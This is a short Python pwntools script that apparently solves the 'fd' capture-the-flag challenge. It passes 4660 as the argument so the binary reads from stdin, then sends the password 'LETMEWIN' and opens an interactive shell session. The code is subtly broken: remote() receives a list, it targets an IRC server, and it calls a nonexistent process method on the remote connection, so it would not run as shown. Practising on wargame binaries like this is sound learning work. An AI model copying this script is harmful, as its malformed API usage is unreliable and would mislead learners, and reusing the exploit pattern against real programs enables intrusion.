from pwn import*

r = remote(["irc.netgarage.org",6667])
p = r.process (["./fd", b"4660"])

payload = b"LETMEWIN"

p.sendline(payload)
p.interactive()